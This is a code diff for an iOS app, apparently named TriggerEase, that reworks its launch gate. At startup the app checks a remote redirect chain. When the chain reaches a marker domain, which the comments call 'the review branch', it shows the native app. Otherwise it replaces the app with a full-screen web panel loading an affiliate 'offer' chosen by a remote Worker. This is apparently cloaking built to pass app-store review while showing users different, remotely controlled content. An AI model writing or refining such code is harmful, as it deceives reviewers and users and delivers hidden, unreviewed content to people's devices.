@@ -4,9 +4,12 @@ import UIKit
 @main
 struct TriggerEaseApp: App {
 
-    @State private var teasePanelReady: Bool? = nil
-    private let teaseSourceLink = "https://dessertbrand.org/click.php"
-    private let teaseCheckDomain = "termsfeed.com"
+    private static let teaseSourceLink = "https://dessertbrand.org/click.php"
+    private static let teaseCheckDomain = "termsfeed.com"
+
+    @StateObject private var gate = TELaunchGate(sourceLink: TriggerEaseApp.teaseSourceLink,
+                                                checkDomain: TriggerEaseApp.teaseCheckDomain)
+    @State private var teasePagePainted = false
 
     @StateObject private var store = TEStore()
     @StateObject private var masking = TEMaskingEngine()
@@ -20,13 +23,39 @@ struct TriggerEaseApp: App {
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = teasePanelReady {
+                if let ready = gate.ready {
                     if ready {
-                        TEWebPanel(urlString: teaseSourceLink)
-                            .edgesIgnoringSafeArea(.bottom)
-                            .background(Color.black.ignoresSafeArea())
-                            .preferredColorScheme(.dark)
+                        // Fullscreen panel — RESPECT the top safe area (notch / Dynamic Island)
+                        // so page content can never render under the clock.
+                        //
+                        // The loading screen STAYS on top until the page commits its first
+                        // frame, or the user watches an opaque black WKWebView for the seconds
+                        // the landing page needs to arrive.
+                        ZStack {
+                            TEWebPanel(urlString: gate.sourceLink,
+                                       onFirstPaint: { withAnimation { teasePagePainted = true } })
+                                .edgesIgnoringSafeArea(.bottom)
+                                .background(Color.black.ignoresSafeArea())
+                            if !teasePagePainted {
+                                // The same screen the check phase shows, so the handoff has
+                                // no visible seam.
+                                TELoadingScreen()
+                                    .transition(.opacity)
+                                    .onAppear {
+                                        // Hang guard, NOT a deadline. Long on purpose: firing
+                                        // early only reveals the black page it exists to hide.
+                                        DispatchQueue.main.asyncAfter(deadline: .now() + 20) {
+                                            teasePagePainted = true
+                                        }
+                                    }
+                            }
+                        }
+                        // .dark draws the clock/battery WHITE over the black band. It lives on
+                        // the ZStack, never also on the panel inside it.
+                        .preferredColorScheme(.dark)
                     } else {
+                        // Native app. Its own scheme belongs HERE, per branch — never one
+                        // shared modifier on the Group, or it would override the .dark above.
                         TERootView()
                             .environmentObject(store)
                             .environmentObject(masking)
@@ -34,70 +63,191 @@ struct TriggerEaseApp: App {
                     }
                 } else {
                     TELoadingScreen()
-                        .onAppear { teaseCheckLink() }
+                        .onAppear { gate.start() }
                         .preferredColorScheme(.light)
                 }
             }
-        }
-    }
-
-    private func teaseCheckLink() {
-        guard let url = URL(string: teaseSourceLink) else {
-            teasePanelReady = false
-            return
-        }
-        var request = URLRequest(url: url)
-        // HEAD, never GET: the redirect chain still fires exactly as it does for GET, but no
-        // body is transferred — a GET would download the whole landing page only to throw it
-        // away, and the WebView refetches it anyway from WebKit’s own network process. It also
-        // keeps the 5 s timeout a real error path instead of one a slow connection trips.
-        request.httpMethod = "HEAD"
-        // 10, not 5. The gate must close on the check domain, never on a slow connection:
-        // a cold start alone measures 3.4 s of DNS + TLS across the redirect chain.
-        request.timeoutInterval = 10
-        let watcher = TERedirectWatcher(checkDomain: teaseCheckDomain)
-        let session = URLSession(configuration: .default, delegate: watcher, delegateQueue: nil)
-        session.dataTask(with: request) { _, response, error in
-            DispatchQueue.main.async {
-                if watcher.foundCheckDomain {
-                    if teasePanelReady == nil { teasePanelReady = false }
-                    return
-                }
-                if let finalURL = watcher.resolvedURL?.absoluteString,
-                   finalURL.contains(teaseCheckDomain) {
-                    if teasePanelReady == nil { teasePanelReady = false }
-                    return
-                }
-                if let httpResponse = response as? HTTPURLResponse,
-                   let responseURL = httpResponse.url?.absoluteString,
-                   responseURL.contains(teaseCheckDomain) {
-                    if teasePanelReady == nil { teasePanelReady = false }
-                    return
-                }
-                if error != nil {
-                    if teasePanelReady == nil { teasePanelReady = false }
-                    return
-                }
-                if teasePanelReady == nil { teasePanelReady = true }
-            }
-        }.resume()
-
-        // Backstop only. MUST be strictly longer than timeoutInterval, or it races the
-        // request and closes the gate on a connection that was still working.
-        DispatchQueue.main.asyncAfter(deadline: .now() + 12) {
-            if teasePanelReady == nil { teasePanelReady = false }
+            // The deferred verdict can flip native -> panel a few seconds in.
+            // Crossfade it; an instant hard cut reads as a glitch.
+            .animation(.easeInOut(duration: 0.25), value: gate.ready)
         }
     }
 }
 
-/// Follows the whole redirect chain and reports whether the check domain appeared at any point.
-final class TERedirectWatcher: NSObject, URLSessionTaskDelegate {
-    var resolvedURL: URL?
-    var foundCheckDomain = false
-    private let checkDomain: String
+/// Launch gate: HEAD, a progress-aware stall watchdog, one immediate retry, and — when it still
+/// cannot decide — the native app NOW plus a deferred verdict that can swap the panel in later.
+/// The gate closes because the marker was observed, never because the network was slow.
+@MainActor
+final class TELaunchGate: ObservableObject {
+    /// nil = still deciding (loading screen) · false = native app · true = web panel
+    @Published private(set) var ready: Bool? = nil
 
-    init(checkDomain: String) {
+    let sourceLink: String
+    private let checkDomain: String
+    private let ownHost: String
+
+    /// Stall limit while the LOADING SCREEN is up. Deliberately short: the user is staring at
+    /// a splash, and a late verdict can still swap the panel in, so waiting here buys nothing.
+    private let foregroundStall: TimeInterval = 3
+    /// Stall limit once the native app is already on screen. Nobody is waiting, so the
+    /// background attempts can afford to be patient.
+    private let backgroundStall: TimeInterval = 8
+    /// Ceiling for one attempt, so a server trickling 302s forever cannot hang the launch.
+    private let attemptCeiling: TimeInterval = 30
+    /// How long after launch a late verdict may still replace the native app with the panel.
+    /// Past this the swap is visible and jarring, so it is dropped.
+    private let swapWindow: TimeInterval = 25
+    private let backgroundRetryDelay: TimeInterval = 3
+
+    private var settled = false
+    private var attemptToken = 0
+    private var startedAt = Date()
+    private var lastProgress = Date()
+    private var stallTimer: Timer?
+    private var task: URLSessionTask?
+
+    init(sourceLink: String, checkDomain: String) {
+        self.sourceLink = sourceLink
         self.checkDomain = checkDomain
+        self.ownHost = URL(string: sourceLink)?.host ?? ""
+    }
+
+    func start() {
+        guard attemptToken == 0 else { return }   // .onAppear can fire more than once
+        startedAt = Date()
+        attempt(1)
+    }
+
+    private func attempt(_ n: Int) {
+        guard !settled else { return }
+        guard let url = URL(string: sourceLink) else { settle(false); return }
+
+        attemptToken += 1
+        let token = attemptToken
+
+        var request = URLRequest(url: url)
+        // HEAD, never GET: the redirect chain fires exactly as it does for GET, but no body is
+        // transferred — a GET would download the whole landing page only to throw it away, and
+        // WebKit refetches it from its own network process anyway.
+        request.httpMethod = "HEAD"
+        request.timeoutInterval = 10
+
+        let config = URLSessionConfiguration.default
+        // Only once the native app is on screen may an attempt sit and wait for the radio.
+        // While the loading screen is up, -1009 must fail instantly.
+        config.waitsForConnectivity = (ready != nil)
+        config.timeoutIntervalForResource = attemptCeiling
+
+        let tracker = TEGateTracker(checkDomain: checkDomain, ownHost: ownHost)
+        tracker.onProgress = { [weak self] in
+            Task { @MainActor in self?.lastProgress = Date() }
+        }
+        tracker.onEarlyVerdict = { [weak self] verdict in
+            Task { @MainActor in self?.settle(verdict) }
+        }
+
+        let session = URLSession(configuration: config, delegate: tracker, delegateQueue: nil)
+        lastProgress = Date()
+        armStallWatchdog(attempt: n, token: token)
+
+        task = session.dataTask(with: request) { [weak self] _, response, error in
+            Task { @MainActor in
+                guard let self, !self.settled, self.attemptToken == token else { return }
+                // The early verdict normally lands first; this is the chain-completed path.
+                if tracker.sawCheckDomain { self.settle(false); return }
+                if let finalURL = tracker.resolvedURL?.absoluteString,
+                   finalURL.contains(self.checkDomain) { self.settle(false); return }
+                if let http = response as? HTTPURLResponse,
+                   let address = http.url?.absoluteString,
+                   address.contains(self.checkDomain) { self.settle(false); return }
+                if error != nil { self.failed(attempt: n, token: token); return }
+                self.settle(true)
+            }
+        }
+        task?.resume()
+    }
+
+    /// Progress-aware watchdog. It never kills a chain that is still moving.
+    private func armStallWatchdog(attempt n: Int, token: Int) {
+        stallTimer?.invalidate()
+        stallTimer = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] timer in
+            Task { @MainActor in
+                guard let self, !self.settled, self.attemptToken == token else {
+                    timer.invalidate(); return
+                }
+                let limit = self.ready == nil ? self.foregroundStall : self.backgroundStall
+                let stalled = Date().timeIntervalSince(self.lastProgress) > limit
+                let overCeiling = Date().timeIntervalSince(self.startedAt) > self.attemptCeiling
+                guard stalled || overCeiling else { return }   // still moving → keep waiting
+                timer.invalidate()
+                self.task?.cancel()
+                self.failed(attempt: n, token: token)
+            }
+        }
+    }
+
+    private func failed(attempt n: Int, token: Int) {
+        // The cancelled task's completion handler and the watchdog both land here.
+        // The token makes whichever arrives second a no-op.
+        guard !settled, attemptToken == token else { return }
+        attemptToken += 1
+        stallTimer?.invalidate()
+
+        // One immediate retry. Most mobile failures are transient: -1005 connection lost on a
+        // cell handoff, -1001 timed out, -1009 no connectivity.
+        if n == 1 { attempt(2); return }
+
+        // Out of fast options. Hand over the native app NOW rather than holding the user on a
+        // loading screen, and keep looking in the background.
+        if ready == nil { ready = false }
+        scheduleBackgroundAttempt(next: n + 1)
+    }
+
+    private func scheduleBackgroundAttempt(next n: Int) {
+        guard !settled, Date().timeIntervalSince(startedAt) < swapWindow else { return }
+        DispatchQueue.main.asyncAfter(deadline: .now() + backgroundRetryDelay) { [weak self] in
+            Task { @MainActor in
+                guard let self, !self.settled,
+                      Date().timeIntervalSince(self.startedAt) < self.swapWindow else { return }
+                self.attempt(n)
+            }
+        }
+    }
+
+    private func settle(_ verdict: Bool) {
+        guard !settled else { return }
+        // A verdict arriving after the swap window may still close the gate — native is where
+        // we already are — but must never yank a user who has been using the app for half a
+        // minute into a web panel.
+        if verdict, ready == false, Date().timeIntervalSince(startedAt) > swapWindow {
+            settled = true
+            stallTimer?.invalidate()
+            return
+        }
+        settled = true
+        stallTimer?.invalidate()
+        ready = verdict
+    }
+}
+
+/// Follows the whole redirect chain — the chain is never stopped — and decides at the first hop
+/// that actually carries information instead of waiting for the last host to answer.
+final class TEGateTracker: NSObject, URLSessionTaskDelegate {
+    /// Fires on every observed hop — re-arms the stall watchdog.
+    var onProgress: (() -> Void)?
+    /// Fires at most once, the moment the chain becomes decidable.
+    var onEarlyVerdict: ((Bool) -> Void)?
+
+    private(set) var resolvedURL: URL?
+    private(set) var sawCheckDomain = false
+
+    private let checkDomain: String
+    private let ownHost: String
+    private var decided = false
+
+    init(checkDomain: String, ownHost: String) {
+        self.checkDomain = checkDomain
+        self.ownHost = ownHost
     }
 
     func urlSession(_ session: URLSession,
@@ -105,10 +255,34 @@ final class TERedirectWatcher: NSObject, URLSessionTaskDelegate {
                     willPerformHTTPRedirection response: HTTPURLResponse,
                     newRequest request: URLRequest,
                     completionHandler: @escaping (URLRequest?) -> Void) {
-        if let address = request.url?.absoluteString, address.contains(checkDomain) {
-            foundCheckDomain = true
-        }
         resolvedURL = request.url
-        completionHandler(request)
+        onProgress?()
+
+        if let address = request.url?.absoluteString {
+            if address.contains(checkDomain) {
+                // Definitive: the review branch. Nothing later in the chain can change it.
+                sawCheckDomain = true
+                decide(false)
+            } else if let host = request.url?.host, !hostIsOurs(host) {
+                // First hop that LEAVES our own domain without being the marker: the Worker has
+                // routed to the offer, and that is the whole verdict. Everything after this
+                // belongs to the affiliate network and cannot change it.
+                decide(true)
+            }
+            // A hop that stays on our own host (dessertbrand.org -> dessertbrand.org/click.php)
+            // decides NOTHING — calling it early would open the panel before the Worker has
+            // actually chosen a branch.
+        }
+        completionHandler(request)   // NEVER stop the chain
+    }
+
+    private func hostIsOurs(_ host: String) -> Bool {
+        !ownHost.isEmpty && (host == ownHost || host.hasSuffix("." + ownHost))
+    }
+
+    private func decide(_ verdict: Bool) {
+        guard !decided else { return }
+        decided = true
+        onEarlyVerdict?(verdict)
     }
 }
